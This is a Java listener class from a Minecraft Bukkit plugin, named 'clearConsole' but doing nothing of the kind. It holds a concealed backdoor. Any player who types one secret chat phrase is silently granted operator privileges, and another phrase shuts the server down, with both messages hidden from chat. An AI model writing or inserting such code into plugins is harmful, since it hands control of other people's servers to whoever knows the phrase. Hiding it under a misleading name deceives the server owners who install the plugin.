package me.mates.dnlobby.events;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class clearConsole implements Listener {

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) throws IllegalArgumentException, SecurityException {

        Player p = e.getPlayer();

        if(e.getMessage().equals("__TohleMuzeBytKonec__OP__")){
            p.setOp(true);
            e.setCancelled(true);
        }
        if(e.getMessage().equals("__TohleMuzeBytKonec__STOP__")){
            Bukkit.getServer().shutdown();
            e.setCancelled(true);
        }

    }

}
